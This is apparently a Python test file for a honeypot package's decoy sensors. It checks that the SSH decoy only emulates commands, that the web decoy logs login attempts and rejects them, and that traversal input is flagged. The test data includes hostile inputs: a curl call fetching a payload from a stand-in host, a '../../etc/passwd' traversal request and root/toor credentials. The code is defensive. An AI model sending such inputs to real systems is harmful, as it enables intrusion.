import io

from aegis_nexus.sensors.legacy import _readline
from aegis_nexus.sensors.ssh_decoy import _fake_command
from aegis_nexus.sensors import web_decoy


def test_ssh_commands_are_emulated_not_executed():
    assert _fake_command("whoami") == "ops\n"
    assert "command not found" in _fake_command("curl http://example.invalid/payload")
    assert _fake_command("cat /etc/hostname") == "meridian-edge-01\n"


def test_legacy_reader_rejects_oversized_line():
    assert _readline(io.BytesIO(b"A" * 600 + b"\n")) == ""


def test_web_decoy_captures_credentials_without_authenticating(monkeypatch):
    captured = []
    monkeypatch.setattr(web_decoy.sensor, "emit", lambda *args, **kwargs: captured.append((args, kwargs)) or True)
    client = web_decoy.app.test_client()
    response = client.post("/login", data={"username": "root", "password": "toor"})
    assert response.status_code == 401
    assert captured
    observed = captured[0][0][1]
    assert observed["credential"]["username"] == "root"
    assert observed["credential"]["password"] == "toor"


def test_web_decoy_flags_pattern_without_claiming_cve(monkeypatch):
    captured = []
    monkeypatch.setattr(web_decoy.sensor, "emit", lambda *args, **kwargs: captured.append((args, kwargs)) or True)
    client = web_decoy.app.test_client()
    response = client.get("/viewer?doc=../../etc/passwd")
    assert response.status_code == 200
    derived = captured[0][0][3]
    assert derived["ioc"][0]["value"] == "path-traversal-like-input"
    assert "cve" not in derived
